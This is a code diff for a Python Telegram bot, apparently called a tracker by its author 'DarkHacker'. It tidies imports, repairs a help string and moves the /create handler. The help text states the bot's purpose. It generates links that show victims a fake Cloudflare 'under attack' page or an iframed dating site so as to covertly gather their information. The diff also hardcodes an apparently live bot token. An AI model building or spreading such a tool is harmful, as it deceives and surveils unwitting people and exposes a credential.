@@ -3,6 +3,8 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import urllib.parse
 import urllib.request
 import base64
+from flask import Flask
+from threading import Thread
 
 TOKEN = '8840717306:AAEOhGfFnZsSWGtdOChaJaGC4JLfReeKBaU'
 
@@ -126,6 +128,7 @@ DEV - DarkHacker 🕷"""
     except Exception as e:
         bot.send_message(message.chat.id, "Invalid URL format! Please try again by sending a correct link.")
         user_state[message.from_user.id] = "waiting_for_link"
+
 @bot.message_handler(commands=['help'])
 def send_help(message):
     help_text = """THROUGH THIS BOT 🤖 YOU CAN TRACK PEOPLE JUST BY SENDING A SIMPLE LINK 🔗.
@@ -136,10 +139,15 @@ SEND /create TO BEGIN , AFTERWARDS IT WILL ASK YOU FOR A URL WHICH WILL BE USED 
 1. CLOUDFLARE LINK: THIS METHOD WILL SHOW A CLOUDFLARE UNDER ATTACK PAGE TO GATHER INFORMATIONS AND AFTERWARDS VICTIM WILL BE REDIRECTED TO DESTINATIONED URL.
 2. WEBVIEW LINK: THIS WILL SHOW A WEBSITE (ex bing , DATING SITES ETC) USING IFRAME FOR GATHERING INFORMATION.( ⚠️ MANY SITES MAY NOT WORK UNDER THIS METHOD IF THEY HAVE X-FRAME HEADER PRESENT.ex HTTPS://google.com )
 
-OWNER - @darkhacker1230
-    from flask import Flask
-from threading import Thread
+OWNER - @darkhacker1230"""
+    bot.reply_to(message, help_text)
 
+@bot.message_handler(commands=['create'])
+def create_link(message):
+    user_state[message.from_user.id] = "waiting_for_link"
+    bot.reply_to(message, "🔗 Please send the URL you want to use for tracking:")
+
+# ------- Flask keep-alive (module level) -------
 app = Flask('')
 
 @app.route('/')
@@ -152,9 +160,8 @@ def run():
 def keep_alive():
     t = Thread(target=run)
     t.start()
+
 keep_alive()
-@bot.message_handler(commands=['create'])
-def create_link(message):
-    user_state[message.from_user.id] = "waiting_for_link"
-    bot.reply_to(message, "🔗 Please send the URL you want to use for tracking:")
+
+# ------- Start bot polling -------
 bot.infinity_polling()
